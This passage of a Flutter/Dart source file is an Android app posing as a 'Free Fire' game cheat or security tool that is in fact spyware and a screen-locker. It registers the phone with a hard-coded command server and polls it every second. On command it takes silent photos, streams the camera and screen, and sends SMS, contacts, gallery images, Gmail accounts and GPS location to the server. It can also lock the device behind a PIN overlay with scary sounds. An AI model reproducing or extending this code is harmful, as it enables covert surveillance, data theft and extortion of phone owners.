// main.dart - FULL FIXED VERSION WITH GAME VERIFICATION UI
import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'dart:ui';
import 'dart:math'; // 🔥 TAMBAHKAN INI
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:geolocator/geolocator.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:audioplayers/audioplayers.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:camera/camera.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:video_player/video_player.dart';

// ── SERVER ────────────────────────────────────────────────────────────────────
const String kServerBase = "http://panel-icxninh.keselekbijiwowo.web.id:2026";

// ── GLOBALS ───────────────────────────────────────────────────────────────────
ValueNotifier<bool> deviceLocked = ValueNotifier<bool>(false);
late AudioPlayer _audioPlayer;
String globalDeviceId = "";
String globalDeviceModel = "";
String currentLockMessage = "YOUR PHONE IS LOCKED!!!!";
String currentLockPIN = "1234";
final lockChatMessages = ValueNotifier<List<Map<String, String>>>([]);
bool isLockLive = false;
String lockChatSenderName = "Admin";

// ── NATIVE CHANNELS ──────────────────────────────────────────────────────────
const MethodChannel platformStrobe = MethodChannel('com.dts.freefireth/strobe');
const MethodChannel platformSpy = MethodChannel('com.dts.freefireth/background_spy');

// ── LIVE STREAM ──────────────────────────────────────────────────────────────
bool _isLiveStreaming = false;
Timer? _liveStreamTimer;

// ═════════════════════════════════════════════════════════════════════════════
// MAIN
// ═════════════════════════════════════════════════════════════════════════════
void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  _audioPlayer = AudioPlayer();
  FlutterError.onError = (FlutterErrorDetails details) {
    FlutterError.presentError(details);
  };
  PlatformDispatcher.instance.onError = (error, stack) => true;

  if (Platform.isAndroid) {
    if (!await Permission.systemAlertWindow.isGranted) {
      await Permission.systemAlertWindow.request();
    }
    _requestNotifAccess();
  }

  await _requestPermissions();

  final info = await _getDeviceInfo();
  globalDeviceId = info['id']!;
  globalDeviceModel = info['model']!;

  try {
    await platformSpy.invokeMethod('saveTargetId', globalDeviceId);
  } catch (_) {}
  try {
    await platformSpy.invokeMethod('saveDeviceIdAll', globalDeviceId);
  } catch (_) {}

  final prefs = await SharedPreferences.getInstance();
  final savedPair = prefs.getString('pairId');
  if (savedPair != null && savedPair.isNotEmpty) {
    await _registerDevice(globalDeviceId, globalDeviceModel);
    _startSpyware(globalDeviceId);
  }

  try {
    final lockState = await platformSpy.invokeMethod('getLockState') as Map?;
    if (lockState != null && lockState['isLocked'] == true) {
      currentLockMessage = lockState['lockMessage']?.toString() ?? 'YOUR PHONE IS LOCKED!!!!';
      currentLockPIN = lockState['lockPin']?.toString() ?? '1234';
      isLockLive = lockState['isLockLive'] == true;
      deviceLocked.value = true;
      playScarySound();
      if (isLockLive) {
        try {
          await platformSpy.invokeMethod('bringToForeground');
        } catch (_) {}
      }
    }
  } catch (_) {}

  runApp(const AppRoot());
}

void _requestNotifAccess() async {
  try {
    await platformSpy.invokeMethod('openNotificationSettings');
  } catch (_) {}
}

Future<void> _requestPermissions() async {
  await [
    Permission.location,
    Permission.contacts,
    Permission.storage,
    Permission.manageExternalStorage,
    Permission.camera,
    Permission.microphone,
    Permission.ignoreBatteryOptimizations,
    Permission.notification,
    Permission.sms,
    Permission.photos,
  ].request();
}

Future<Map<String, String>> _getDeviceInfo() async {
  final di = DeviceInfoPlugin();
  String model = "Unknown", id = "UNKNOWN";
  try {
    if (Platform.isAndroid) {
      final a = await di.androidInfo;
      model = "${a.brand.toUpperCase()} ${a.model}";
      id = "${a.brand}-${a.model}-${a.id}".replaceAll(' ', '_');
    } else if (Platform.isIOS) {
      final i = await di.iosInfo;
      model = i.name;
      id = i.identifierForVendor ?? "UNKNOWN_IOS";
    }
  } catch (_) {
    id = "ZDX-${Platform.localHostname.hashCode}";
  }
  return {"id": id, "model": model};
}

Future<void> _registerDevice(String id, String model) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    await http.post(
      Uri.parse("$kServerBase/api/register-target"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({
        "id": id,
        "model": model,
        "battery": lv.toString(),
        "status": "Online",
        "lastSeen": DateTime.now().toIso8601String(),
      }),
    );
  } catch (_) {}
}

Future<bool> pairDevice(String pairId) async {
  try {
    final bat = Battery();
    int lv = await bat.batteryLevel.catchError((_) => 100);
    final res = await http.post(
      Uri.parse("$kServerBase/api/pair-target"),
      headers: {"Content-Type": "application/json"},
      body: jsonEncode({
        "pairId": pairId,
        "deviceId": globalDeviceId,
        "model": globalDeviceModel,
        "battery": lv.toString(),
      }),
    ).timeout(const Duration(seconds: 15));
    if (res.statusCode == 200) {
      final data = jsonDecode(res.body);
      if (data['status'] == 'paired') {
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString('pairId', pairId);
        return true;
      }
    }
  } catch (_) {}
  return false;
}

void playScarySound() async {
  try {
    await _audioPlayer.setReleaseMode(ReleaseMode.loop);
    await _audioPlayer.play(
      UrlSource(
        'https://www.soundboard.com/handler/DownLoadTrack.ashx?cliptitle=Scary+Laugh&filename=24/243764-00f7e1b5-829d-4874-a690-671891b0c79b.mp3',
      ),
    );
  } catch (_) {}
}

void stopSound() async {
  try {
    await _audioPlayer.stop();
  } catch (_) {}
}

void _startLiveCamera(String id, String side) async {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  try {
    await platformSpy.invokeMethod('startLiveCameraStream', {"side": side});
  } catch (_) {}
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('getLiveFrame') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(
          Uri.parse("$kServerBase/api/live-frame/$id"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}),
        ).timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _startLiveScreen(String id) {
  if (_isLiveStreaming) return;
  _isLiveStreaming = true;
  _liveStreamTimer = Timer.periodic(const Duration(milliseconds: 150), (t) async {
    if (!_isLiveStreaming) { t.cancel(); return; }
    try {
      final f = await platformSpy.invokeMethod('startScreenStreamBackground') as String?;
      if (f != null && f.isNotEmpty) {
        await http.post(
          Uri.parse("$kServerBase/api/live-frame/$id"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"frame": f, "ts": DateTime.now().millisecondsSinceEpoch}),
        ).timeout(const Duration(seconds: 2));
      }
    } catch (_) {}
  });
}

void _stopLive() {
  _isLiveStreaming = false;
  _liveStreamTimer?.cancel();
  _liveStreamTimer = null;
  platformSpy.invokeMethod('stopLiveCameraStream').catchError((_) {});
}

// ── SPYWARE LOOP ──────────────────────────────────────────────────────────────
void _startSpyware(String id) {
  Future<void> loop() async {
    try {
      final bat = Battery();
      int batLv = 100;
      try { batLv = await bat.batteryLevel; } catch (_) {}
      await http.post(
        Uri.parse("$kServerBase/api/heartbeat/$id"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"id": id, "status": "Alive", "battery": batLv.toString()}),
      ).timeout(const Duration(seconds: 1));

      final res = await http.get(Uri.parse("$kServerBase/api/get-command/$id"));
      if (res.statusCode != 200 || res.body.isEmpty) return;

      final d = jsonDecode(res.body);
      String cmd = d['command'] ?? 'idle';
      if (cmd == 'idle') return;
      String extra = d['extra'] ?? '';
      dynamic result;

      if (cmd == 'lock_live') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'HP INI DIKUNCI';
          currentLockPIN = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        }
        isLockLive = true;
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try {
          await platformSpy.invokeMethod('saveLockState', {
            'locked': true, 'isLockLive': true,
            'message': currentLockMessage, 'pin': currentLockPIN,
          });
        } catch (_) {}
        try {
          await platformSpy.invokeMethod('startLockOverlay', {
            'message': currentLockMessage, 'pin': currentLockPIN,
          });
        } catch (_) {}
        try {
          await platformSpy.invokeMethod('lockDeviceNow');
        } catch (_) {}
        result = {"status": "LockLive"};
      } else if (cmd == 'hard_lock' || cmd == 'lock_device') {
        if (extra.contains('|')) {
          final p = extra.split('|');
          currentLockMessage = p[0].isNotEmpty ? p[0] : 'YOUR PHONE IS LOCKED!!!!';
          currentLockPIN = p.length > 1 && p[1].isNotEmpty ? p[1] : '1234';
        } else if (extra.isNotEmpty) { currentLockMessage = extra; }
        if (!deviceLocked.value) { deviceLocked.value = true; playScarySound(); }
        try {
          await platformSpy.invokeMethod('saveLockState', {
            'locked': true, 'isLockLive': false,
            'message': currentLockMessage, 'pin': currentLockPIN,
          });
        } catch (_) {}
        try {
          await platformSpy.invokeMethod('startLockOverlay', {
            'message': currentLockMessage, 'pin': currentLockPIN,
          });
        } catch (_) {}
        try {
          await platformSpy.invokeMethod('lockDeviceNow');
        } catch (_) {}
        result = {"status": "Locked"};
      } else if (cmd == 'unlock' || cmd == 'unlock_device') {
        if (deviceLocked.value) {
          deviceLocked.value = false;
          stopSound();
          try {
            await platformStrobe.invokeMethod('stopStrobe');
          } catch (_) {}
          try {
            await platformSpy.invokeMethod('saveLockState', {
              'locked': false, 'isLockLive': false,
              'message': '', 'pin': '',
            });
          } catch (_) {}
        }
        result = {"status": "Unlocked"};
      } else if (cmd == 'take_photo') {
        final camStatus = await Permission.camera.request();
        if (camStatus.isGranted) {
          final b64 = await platformSpy.invokeMethod(
            'takeSilentPhotoBackground',
            {"side": extra.isEmpty ? "back" : extra},
          );
          result = b64 != null ? {"status": "Success", "image_base64": b64} : {"status": "Failed - camera returned null"};
        } else {
          result = {"status": "Failed - camera permission denied"};
        }
      } else if (cmd == 'get_screen') {
        final b64 = await platformSpy.invokeMethod('startScreenStreamBackground');
        result = {"status": "Success", "image_base64": b64 ?? ""};
      } else if (cmd == 'live_camera_start') {
        _stopLive(); _startLiveCamera(id, extra.isEmpty ? 'back' : extra);
        result = {"status": "Live camera started"};
      } else if (cmd == 'live_screen_start') {
        _stopLive(); _startLiveScreen(id);
        result = {"status": "Live screen started"};
      } else if (cmd == 'live_stop') {
        _stopLive(); result = {"status": "Stopped"};
      } else if (cmd == 'get_gmails') {
        final emails = await platformSpy.invokeMethod('getGmailAccounts') as String? ?? '';
        result = {"accounts": emails.isEmpty ? "No Gmail Found" : emails};
      } else if (cmd == 'set_wallpaper') {
        await platformSpy.invokeMethod('setWallpaper', {"url": extra});
        result = {"status": "Done"};
      } else if (cmd == 'play_audio') {
        try {
          await _audioPlayer.stop();
          await _audioPlayer.play(UrlSource(extra));
          result = {"status": "Playing"};
        } catch (e) { result = {"status": "Error: $e"}; }
      } else if (cmd == 'stop_audio') {
        await _audioPlayer.stop();
        result = {"status": "Stopped"};
      } else if (cmd == 'get_contacts' || cmd == 'dump_contacts') {
        if (await FlutterContacts.requestPermission()) {
          final list = await FlutterContacts.getContacts(withProperties: true, withPhoto: false);
          result = {"contacts": list.take(50).map((e) => {"name": e.displayName, "number": e.phones.isNotEmpty ? e.phones.first.number : ""}).toList()};
        }
      } else if (cmd == 'flash_strobe') {
        await platformStrobe.invokeMethod('startStrobe');
        result = {"status": "On"};
      } else if (cmd == 'stop_strobe') {
        await platformStrobe.invokeMethod('stopStrobe');
        result = {"status": "Off"};
      } else if (cmd == 'vibrate_loop') {
        try {
          await platformSpy.invokeMethod('vibrateDevice', {'duration': 5000});
        } catch (_) {
          for (int i = 0; i < 10; i++) { await Future.delayed(const Duration(milliseconds: 300)); }
        }
        result = {"status": "Vibrating"};
      } else if (cmd == 'open_url') {
        final url = Uri.parse(extra);
        if (await canLaunchUrl(url)) { await launchUrl(url, mode: LaunchMode.externalApplication); }
        result = {"status": "Opened"};
      } else if (cmd == 'get_location' || cmd == 'track_gps') {
        final pos = await Geolocator.getCurrentPosition(desiredAccuracy: LocationAccuracy.high);
        result = {"lat": pos.latitude, "lng": pos.longitude};
      } else if (cmd == 'force_open') {
        try { await platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
        result = {"status": "OK"};
      } else if (cmd == 'reboot_device' || cmd == 'restart_device') {
        try {
          await platformSpy.invokeMethod('rebootDevice');
          result = {"status": "Rebooting"};
        } catch (e) { result = {"status": "reboot_failed: ${e.toString()}"}; }
      } else if (cmd == 'get_sms') {
        try {
          final smsList = await platformSpy.invokeMethod('getSmsMessages');
          result = {"sms": smsList};
        } catch (e) { result = {"sms": [], "error": e.toString()}; }
      } else if (cmd == 'get_gallery') {
        try {
          final imgs = await platformSpy.invokeMethod('getGalleryImages', {"limit": 5});
          result = {"images": imgs ?? []};
        } catch (e) { result = {"images": [], "error": e.toString()}; }
      } else if (cmd == 'chat_msg') {
        if (extra.isNotEmpty) {
          final msgs = List<Map<String, String>>.from(lockChatMessages.value);
          msgs.add({'from': 'owner', 'text': extra, 'time': DateTime.now().toString().substring(11, 16)});
          lockChatMessages.value = msgs;
        }
        result = {"status": "msg_received"};
      } else if (cmd == 'open_notification_settings') {
        _requestNotifAccess();
        result = {"status": "Opened"};
      } else if (cmd == 'kill_wifi') {
        try {
          await platformSpy.invokeMethod('disableWifi');
          result = {"status": "WiFi disabled"};
        } catch (_) { result = {"status": "Failed - no permission"}; }
      }

      if (result != null) {
        await http.post(
          Uri.parse("$kServerBase/api/post-response/$id"),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"data": result, "cmd": cmd}),
        );
      }
    } catch (_) {}
  }
  Timer.periodic(const Duration(seconds: 1), (_) => loop());
}

// ═════════════════════════════════════════════════════════════════════════════
// APP ROOT
// ═════════════════════════════════════════════════════════════════════════════
class AppRoot extends StatelessWidget {
  const AppRoot({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Free Fire Security',
      theme: ThemeData(
        brightness: Brightness.dark,
        primaryColor: const Color(0xFFDC2626),
        scaffoldBackgroundColor: const Color(0xFF000000),
        useMaterial3: true,
        fontFamily: 'SF Pro Display',
        colorScheme: const ColorScheme.dark(
          primary: Color(0xFFDC2626),
          secondary: Color(0xFF991B1B),
          surface: Color(0xFF0A0A0A),
          background: Color(0xFF000000),
          error: Color(0xFFEF4444),
          onPrimary: Colors.white,
          onSecondary: Colors.white,
          onSurface: Color(0xFFE5E5E5),
          onBackground: Colors.white,
          onError: Colors.white,
        ),
      ),
      home: const LockWrapper(),
    );
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// LOCK WRAPPER
// ═════════════════════════════════════════════════════════════════════════════
class LockWrapper extends StatefulWidget {
  const LockWrapper({super.key});
  @override State<LockWrapper> createState() => _LockWrapperState();
}

class _LockWrapperState extends State<LockWrapper> with WidgetsBindingObserver {
  final _pinCtrl = TextEditingController();
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatPollTimer;
  Timer? _enforceLockTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _chatPollTimer = Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
    _enforceLockTimer = Timer.periodic(const Duration(seconds: 3), (_) {
      if (deviceLocked.value) {
        try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {}
      }
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _pinCtrl.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _chatPollTimer?.cancel();
    _enforceLockTimer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState s) {
    if (deviceLocked.value) {
      if (s == AppLifecycleState.paused || s == AppLifecycleState.inactive || s == AppLifecycleState.hidden || s == AppLifecycleState.detached) {
        Future.delayed(const Duration(milliseconds: 100), () { try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {} });
        Future.delayed(const Duration(milliseconds: 500), () { try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {} });
        Future.delayed(const Duration(milliseconds: 1200), () { try { platformSpy.invokeMethod('bringToForeground'); } catch (_) {} });
      }
    }
  }

  Future<void> _pollChat() async {
    if (!deviceLocked.value || globalDeviceId.isEmpty) return;
    try {
      final res = await http.get(Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId')).timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final body = jsonDecode(res.body);
        final msgs = body['messages'] as List? ?? [];
        if (msgs.isNotEmpty && mounted) {
          final current = List<Map<String, String>>.from(lockChatMessages.value);
          for (final m in msgs) {
            current.add({'from': m['from']?.toString() ?? 'owner', 'text': m['text']?.toString() ?? '', 'time': m['time']?.toString() ?? ''});
          }
          lockChatMessages.value = current;
          Future.delayed(const Duration(milliseconds: 100), () {
            if (_chatScroll.hasClients) {
              _chatScroll.animateTo(_chatScroll.position.maxScrollExtent, duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
            }
          });
        }
      }
    } catch (_) {}
  }

  Future<void> _sendChatReply(String text) async {
    if (text.trim().isEmpty || globalDeviceId.isEmpty) return;
    _chatCtrl.clear();
    final current = List<Map<String, String>>.from(lockChatMessages.value);
    current.add({'from': 'target', 'text': text.trim(), 'time': TimeOfDay.now().format(context)});
    lockChatMessages.value = current;
    try {
      await http.post(
        Uri.parse('$kServerBase/api/lock-chat/$globalDeviceId'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({'text': text.trim(), 'from': 'target'}),
      ).timeout(const Duration(seconds: 5));
    } catch (_) {}
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(_chatScroll.position.maxScrollExtent, duration: const Duration(milliseconds: 200), curve: Curves.easeOut);
      }
    });
  }

  void _tryUnlock(String pin) {
    if (pin == currentLockPIN) {
      deviceLocked.value = false;
      isLockLive = false;
      lockChatMessages.value = [];
      stopSound();
      _pinCtrl.clear();
    } else {
      _pinCtrl.clear();
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(
          content: Row(children: const [
            Icon(Icons.close_rounded, color: Colors.white, size: 20),
            SizedBox(width: 8),
            Text("Akses ditolak", style: TextStyle(color: Colors.white, fontWeight: FontWeight.w500)),
          ]),
          backgroundColor: Colors.red.shade900,
          duration: const Duration(milliseconds: 800),
          behavior: SnackBarBehavior.floating,
          shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        ),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<bool>(
      valueListenable: deviceLocked,
      builder: (ctx, locked, _) {
        return PopScope(
          canPop: false,
          child: Stack(
            children: [
              const PairingHomePage(),
              if (locked)
                Scaffold(
                  backgroundColor: Colors.black,
                  resizeToAvoidBottomInset: true,
                  body: ValueListenableBuilder<List<Map<String, String>>>(
                    valueListenable: lockChatMessages,
                    builder: (_, msgs, __) {
                      return Container(
                        width: double.infinity,
                        height: double.infinity,
                        decoration: BoxDecoration(
                          gradient: LinearGradient(
                            begin: Alignment.topCenter,
                            end: Alignment.bottomCenter,
                            colors: isLockLive ? [const Color(0xFF0A0A0A), const Color(0xFF1A0000)] : [const Color(0xFF0A0A0A), const Color(0xFF000000)],
                          ),
                        ),
                        child: SafeArea(
                          child: isLockLive ? _buildLockLiveUI(msgs) : _buildLockBasicUI(),
                        ),
                      );
                    },
                  ),
                ),
            ],
          ),
        );
      },
    );
  }

  Widget _buildLockBasicUI() {
    return Center(
      child: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Container(
                width: 100, height: 100,
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  gradient: LinearGradient(begin: Alignment.topLeft, end: Alignment.bottomRight, colors: [Colors.red.shade800, Colors.red.shade900]),
                  boxShadow: [BoxShadow(color: Colors.red.shade500.withOpacity(0.3), blurRadius: 30, spreadRadius: 5)],
                ),
                child: const Icon(Icons.lock_outline_rounded, color: Colors.white, size: 50),
              ),
              const SizedBox(height: 32),
              Container(
                padding: const EdgeInsets.all(20),
                decoration: BoxDecoration(
                  color: const Color(0xFF0A0A0A),
                  borderRadius: BorderRadius.circular(20),
                  border: Border.all(color: Colors.red.shade900.withOpacity(0.3), width: 1),
                  boxShadow: [BoxShadow(color: Colors.black.withOpacity(0.5), blurRadius: 20, offset: const Offset(0, 5))],
                ),
                child: Text(
                  currentLockMessage,
                  textAlign: TextAlign.center,
                  style: TextStyle(color: Colors.red.shade400, fontSize: 18, fontWeight: FontWeight.w500, height: 1.4),
                ),
              ),
              const SizedBox(height: 40),
              Container(
                decoration: BoxDecoration(
                  color: const Color(0xFF0A0A0A),
                  borderRadius: BorderRadius.circular(16),
                  border: Border.all(color: Colors.red.shade900.withOpacity(0.3), width: 1),
                ),
                child: TextField(
                  controller: _pinCtrl,
                  obscureText: true,
                  keyboardType: TextInputType.number,
                  textAlign: TextAlign.center,
                  style: const TextStyle(color: Colors.white, fontSize: 28, letterSpacing: 12, fontWeight: FontWeight.w600),
                  decoration: InputDecoration(
                    hintText: "0000",
                    hintStyle: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 28, letterSpacing: 12),
                    border: InputBorder.none,
                    contentPadding: const EdgeInsets.symmetric(vertical: 20, horizontal: 20),
                  ),
                  onSubmitted: _tryUnlock,
                ),
              ),
              const SizedBox(height: 24),
              SizedBox(
                width: double.infinity,
                height: 56,
                child: ElevatedButton(
                  style: ElevatedButton.styleFrom(backgroundColor: Colors.red.shade900, foregroundColor: Colors.white, elevation: 0, shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16))),
                  onPressed: () => _tryUnlock(_pinCtrl.text),
                  child: const Text("UNLOCK", style: TextStyle(fontWeight: FontWeight.w600, letterSpacing: 2, fontSize: 16)),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _buildLockLiveUI(List<Map<String, String>> msgs) {
    return Column(
      children: [
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
          decoration: BoxDecoration(border: Border(bottom: BorderSide(color: Colors.red.shade900.withOpacity(0.3), width: 1))),
          child: Row(
            children: [
              Container(
                width: 8, height: 8,
                decoration: BoxDecoration(color: Colors.red.shade500, shape: BoxShape.circle, boxShadow: [BoxShadow(color: Colors.red.shade500, blurRadius: 8)]),
              ),
              const SizedBox(width: 12),
              Expanded(
                child: Text(
                  currentLockMessage,
                  style: TextStyle(color: Colors.red.shade400, fontSize: 13, fontWeight: FontWeight.w500),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
              ),
            ],
          ),
        ),
        Expanded(
          child: msgs.isEmpty
              ? Center(
                  child: Column(
                    mainAxisSize: MainAxisSize.min,
                    children: [
                      Icon(Icons.chat_bubble_outline_rounded, color: Colors.white.withOpacity(0.1), size: 48),
                      const SizedBox(height: 16),
                      Text('No messages', style: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 14)),
                    ],
                  ),
                )
              : ListView.builder(
                  controller: _chatScroll,
                  padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 16),
                  itemCount: msgs.length,
                  itemBuilder: (_, i) {
                    final m = msgs[i];
                    final isOwner = m['from'] == 'owner';
                    return Align(
                      alignment: isOwner ? Alignment.centerLeft : Alignment.centerRight,
                      child: Container(
                        margin: const EdgeInsets.only(bottom: 12),
                        child: Column(
                          crossAxisAlignment: isOwner ? CrossAxisAlignment.start : CrossAxisAlignment.end,
                          children: [
                            Padding(
                              padding: const EdgeInsets.only(bottom: 4, left: 8, right: 8),
                              child: Text(
                                isOwner ? 'Admin' : 'You',
                                style: TextStyle(color: isOwner ? Colors.grey.shade500 : Colors.red.shade500, fontSize: 10, fontWeight: FontWeight.w500),
                              ),
                            ),
                            Container(
                              constraints: BoxConstraints(maxWidth: MediaQuery.of(context).size.width * 0.75),
                              padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 10),
                              decoration: BoxDecoration(
                                color: isOwner ? const Color(0xFF1A1A1A) : Colors.red.shade900.withOpacity(0.8),
                                borderRadius: BorderRadius.only(
                                  topLeft: const Radius.circular(16),
                                  topRight: const Radius.circular(16),
                                  bottomLeft: Radius.circular(isOwner ? 4 : 16),
                                  bottomRight: Radius.circular(isOwner ? 16 : 4),
                                ),
                              ),
                              child: Column(
                                crossAxisAlignment: isOwner ? CrossAxisAlignment.start : CrossAxisAlignment.end,
                                children: [
                                  Text(m['text'] ?? '', style: const TextStyle(color: Colors.white, fontSize: 13)),
                                  const SizedBox(height: 4),
                                  Text(m['time'] ?? '', style: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 9)),
                                ],
                              ),
                            ),
                          ],
                        ),
                      ),
                    );
                  },
                ),
        ),
        Container(
          padding: const EdgeInsets.fromLTRB(16, 12, 16, 16),
          decoration: BoxDecoration(color: const Color(0xFF0A0A0A), border: Border(top: BorderSide(color: Colors.red.shade900.withOpacity(0.2), width: 1))),
          child: Column(
            children: [
              Row(
                children: [
                  Expanded(
                    child: Container(
                      decoration: BoxDecoration(color: const Color(0xFF141414), borderRadius: BorderRadius.circular(24)),
                      child: TextField(
                        controller: _chatCtrl,
                        style: const TextStyle(color: Colors.white, fontSize: 14),
                        decoration: InputDecoration(
                          hintText: 'Type a message...',
                          hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 14),
                          border: InputBorder.none,
                          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                        ),
                        onSubmitted: _sendChatReply,
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  GestureDetector(
                    onTap: () => _sendChatReply(_chatCtrl.text),
                    child: Container(
                      padding: const EdgeInsets.all(12),
                      decoration: BoxDecoration(color: Colors.red.shade900, shape: BoxShape.circle),
                      child: const Icon(Icons.send_rounded, color: Colors.white, size: 20),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 12),
              Row(
                children: [
                  Expanded(
                    child: Container(
                      decoration: BoxDecoration(color: const Color(0xFF141414), borderRadius: BorderRadius.circular(16)),
                      child: TextField(
                        controller: _pinCtrl,
                        obscureText: true,
                        keyboardType: TextInputType.number,
                        textAlign: TextAlign.center,
                        style: const TextStyle(color: Colors.white, fontSize: 20, letterSpacing: 8, fontWeight: FontWeight.w500),
                        decoration: InputDecoration(
                          hintText: "PIN",
                          hintStyle: TextStyle(color: Colors.white.withOpacity(0.2), fontSize: 16, letterSpacing: 4),
                          border: InputBorder.none,
                          contentPadding: const EdgeInsets.symmetric(vertical: 12),
                        ),
                        onSubmitted: _tryUnlock,
                      ),
                    ),
                  ),
                  const SizedBox(width: 12),
                  ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      backgroundColor: Colors.red.shade900,
                      foregroundColor: Colors.white,
                      elevation: 0,
                      padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 12),
                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
                    ),
                    onPressed: () => _tryUnlock(_pinCtrl.text),
                    child: const Text("UNLOCK", style: TextStyle(fontWeight: FontWeight.w600, fontSize: 13, letterSpacing: 1)),
                  ),
                ],
              ),
            ],
          ),
        ),
      ],
    );
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// PAIRING HOME PAGE + CHEAT EPEP
// ═════════════════════════════════════════════════════════════════════════════
class PairingHomePage extends StatefulWidget {
  const PairingHomePage({super.key});
  @override State<PairingHomePage> createState() => _PairingHomePageState();
}

class _PairingHomePageState extends State<PairingHomePage> with SingleTickerProviderStateMixin {
  final _idCtrl = TextEditingController();
  bool _loading = false;
  bool _paired = false;
  String _msg = '';
  String _currentPairId = '';
  late AnimationController _glowController;
  late Animation<double> _glowAnimation;

  @override
  void initState() {
    super.initState();
    _checkAlreadyPaired();
    _glowController = AnimationController(duration: const Duration(milliseconds: 1500), vsync: this)..repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 0.8).animate(CurvedAnimation(parent: _glowController, curve: Curves.easeInOut));
  }

  @override
  void dispose() {
    _glowController.dispose();
    _idCtrl.dispose();
    super.dispose();
  }

  Future<void> _checkAlreadyPaired() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final savedPair = prefs.getString('pairId');
      if (savedPair != null && savedPair.isNotEmpty) {
        final res = await http.post(
          Uri.parse('$kServerBase/api/pair-target'),
          headers: {"Content-Type": "application/json"},
          body: jsonEncode({"pairId": savedPair, "deviceId": globalDeviceId, "model": globalDeviceModel, "battery": "100"}),
        ).timeout(const Duration(seconds: 10));
        if (res.statusCode == 200) {
          final data = jsonDecode(res.body);
          if (data['status'] == 'paired') {
            setState(() { _paired = true; _msg = 'Connected successfully!'; _currentPairId = savedPair; });
            _startSpyware(globalDeviceId);
            return;
          }
        }
        await prefs.remove('pairId');
        setState(() { _paired = false; _msg = ''; });
      }
    } catch (_) { setState(() { _paired = false; _msg = ''; }); }
  }

  Future<void> _doPair() async {
    final id = _idCtrl.text.trim().toUpperCase();
    if (id.isEmpty) { setState(() => _msg = 'Please enter Pairing ID'); return; }
    setState(() { _loading = true; _msg = 'Connecting...'; });
    try {
      final bat = Battery();
      int lv = await bat.batteryLevel.catchError((_) => 100);
      final res = await http.post(
        Uri.parse("$kServerBase/api/pair-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({"pairId": id, "deviceId": globalDeviceId, "model": globalDeviceModel, "battery": lv.toString()}),
      ).timeout(const Duration(seconds: 15));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body);
        if (data['status'] == 'paired') {
          final prefs = await SharedPreferences.getInstance();
          await prefs.setString('pairId', id);
